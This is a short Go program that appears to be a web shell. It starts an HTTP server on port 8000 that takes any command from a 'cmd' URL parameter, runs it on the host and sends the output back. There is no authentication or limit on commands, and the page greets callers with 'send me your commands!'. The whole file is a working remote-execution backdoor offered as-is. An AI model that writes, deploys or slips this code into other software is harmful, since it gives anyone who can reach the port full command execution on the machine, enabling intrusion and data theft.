package main

import (
	"bytes"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os/exec"
	"strings"

	runner "github.com/sprkyco/g0sh1t/runner"
)

func Run(cmd string) string {
	var out bytes.Buffer
	unescaped, _ := url.QueryUnescape(cmd)
	commands := strings.Split(unescaped, " ")
	command := string(commands[0])
	args := append(commands[:0], commands[1:]...)

	c := exec.Command(command, args...)
	c.Stdout = &out
	err := c.Run()
	if err != nil {
		log.Fatal(err)
	}
	//	fmt.Printf("out: %q\n", out.String())
	return out.String()
}

func main() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		cmd := r.URL.Query().Get("cmd")

		if len(cmd) < 1 {
			fmt.Fprintf(w, "Hello world, send me your commands!")
		} else {
			output := runner.Run(cmd)
			fmt.Fprintf(w, "Results: %s", output)
		}

	})

	err := http.ListenAndServe(":8000", nil)
	if err != nil {
		panic(err)
	}
}
